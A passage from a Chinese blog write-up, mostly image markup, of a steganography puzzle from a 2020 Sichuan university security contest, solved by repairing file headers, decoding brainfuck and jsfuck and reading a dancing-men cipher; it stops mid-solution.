&lt;/h3&gt;&lt;h3 id=&#34;操作内容-1&#34;&gt;操作内容：
&lt;/h3&gt;&lt;p&gt;我是真的抑郁了。&lt;/p&gt;
&lt;p&gt;开局一张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223214262-269041328.png&#34;
	width=&#34;105&#34;
	height=&#34;118&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223214262-269041328_hu641748049438018634.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223214262-269041328_hu1273127943664534569.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;88&#34;
		data-flex-basis=&#34;213px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;一张图片这么大，必有蹊跷：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223214911-218836370.png&#34;
	width=&#34;253&#34;
	height=&#34;68&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223214911-218836370_hu9002891958653336723.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223214911-218836370_hu2514261110147639229.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;372&#34;
		data-flex-basis=&#34;892px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;本来是用binwalk看看里面是什么东西，后来发现把后缀直接zip来得更快：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223215933-133268883.png&#34;
	width=&#34;506&#34;
	height=&#34;59&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223215933-133268883_hu12166095024038335708.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223215933-133268883_hu8226271007998139400.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;857&#34;
		data-flex-basis=&#34;2058px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;里面是一个包和一张图，先看看图片：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223216321-1352765408.png&#34;
	width=&#34;197&#34;
	height=&#34;76&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223216321-1352765408_hu5311926738747311927.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223216321-1352765408_hu16827505589111910675.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;259&#34;
		data-flex-basis=&#34;622px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;用010打开看看，果不其然文件头需要修复：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223220866-33298590.png&#34;
	width=&#34;402&#34;
	height=&#34;50&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223220866-33298590_hu6154527817623793942.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223220866-33298590_hu13155164005190891200.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;804&#34;
		data-flex-basis=&#34;1929px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;修复后：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223222524-872433129.png&#34;
	width=&#34;398&#34;
	height=&#34;56&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223222524-872433129_hu3194985771153913474.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223222524-872433129_hu385576332616163687.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;710&#34;
		data-flex-basis=&#34;1705px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;我们再次打开看看，图片变成了二维码：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223224295-892476376.png&#34;
	width=&#34;105&#34;
	height=&#34;118&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223224295-892476376_hu6918679581763080889.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223224295-892476376_hu8462908076060104472.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;88&#34;
		data-flex-basis=&#34;213px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;扫码后得到brainfuck加密的东西：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223239085-1224956947.png&#34;
	width=&#34;554&#34;
	height=&#34;230&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223239085-1224956947_hu16569960905475364944.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223239085-1224956947_hu14493326191283418374.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;240&#34;
		data-flex-basis=&#34;578px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;接着再用jsfuck解密：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223240625-873175990.png&#34;
	width=&#34;554&#34;
	height=&#34;219&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223240625-873175990_hu1486316451165629879.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223240625-873175990_hu3062780831292884740.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;252&#34;
		data-flex-basis=&#34;607px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;得到一个时间：20200824152800&lt;/p&gt;
&lt;p&gt;至此，TIME.png里隐藏的信息已经被发现&lt;/p&gt;
&lt;p&gt;我们再来看另一个包，里面有一张图，还有一个加密的图片：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223241641-885765990.png&#34;
	width=&#34;215&#34;
	height=&#34;113&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223241641-885765990_hu13218414571194594393.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223241641-885765990_hu323536971958858182.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;190&#34;
		data-flex-basis=&#34;456px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;考虑到刚刚得到的时间，我们把这段数字输入尝试是否正确，可惜并不对。&lt;/p&gt;
&lt;p&gt;由于我们看出这是一段时间，索性尝试一下与时间最接近的时间戳：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223242730-1047340798.png&#34;
	width=&#34;554&#34;
	height=&#34;46&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223242730-1047340798_hu15228177472473672364.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223242730-1047340798_hu5418131765168327069.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1204&#34;
		data-flex-basis=&#34;2890px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这次正确了，拿出图片：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223248137-830046858.png&#34;
	width=&#34;458&#34;
	height=&#34;100&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223248137-830046858_hu15120636248454274689.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223248137-830046858_hu16527256215630767629.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;458&#34;
		data-flex-basis=&#34;1099px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223249266-2145451.png&#34;
	width=&#34;250&#34;
	height=&#34;64&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223249266-2145451_hu8657340324578512127.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223249266-2145451_hu15847122312199546758.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;390&#34;
		data-flex-basis=&#34;937px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;大小很大的一张图，图片是跳舞的小人，是福尔摩斯跳舞人像的密码，解读之后是：&lt;/p&gt;
&lt;p&gt;WATCHTHEVIDEO&lt;/p&gt;
&lt;p&gt;Video?哪里来的video让我看？&lt;/p&gt;
&lt;p&gt;这次需要从binwalk中取出来了，直接修改后缀不管用。&lt;/p&gt;
&lt;p&gt;从binwalk中可以提取出一张图片和一个文件夹：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223250574-1657543504.png&#34;
	width=&#34;216&#34;
	height=&#34;118&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223250574-1657543504_hu5565519552419958462.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223250574-1657543504_hu17562453235917701881.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;183&#34;
		data-flex-basis=&#34;439px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;确实，这个flag.png需要修复，跟上面一样，修复之后是这个样子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223258584-766429684.png&#34;
	width=&#34;245&#34;
	height=&#34;215&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223258584-766429684_hu7780746641513601019.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223258584-766429684_hu11184124612703562099.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;113&#34;
		data-flex-basis=&#34;273px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;文件夹里是这个样子：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223302522-745318003.png&#34;
	width=&#34;554&#34;
	height=&#34;117&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223302522-745318003_hu4380774500660164487.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223302522-745318003_hu16665005230458313224.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;473&#34;
		data-flex-basis=&#34;1136px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里卡了很久，我完全搞不懂你的名字和篮球和狗有什么联系。&lt;/p&gt;
&lt;p&gt;抑郁了，这次真的抑郁了。在中午吃饭的时候还想着球员衣服上的数字是不是和你的名字的时间轴有关系：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223306285-2018811376.png&#34;
	width=&#34;311&#34;
	height=&#34;345&#34;
	srcset=&#34;https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223306285-2018811376_hu4511974954827803025.png 480w, https://dorinxl.github.io/p/2020%E5%B9%B4%E5%AE%89%E6%B4%B5%E6%9D%AF%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E9%83%A8%E5%88%86writeup/1858293-20200908223306285-2018811376_hu6139210014999723618.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;90&#34;
		data-flex-basis=&#34;216px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;看得出来大家也挺抑郁的。&lt;/p&gt;
&lt;p&gt;后来在队友的帮助下，把这只狗图的高调大，看到了了不得的东西：&lt;/p&gt;
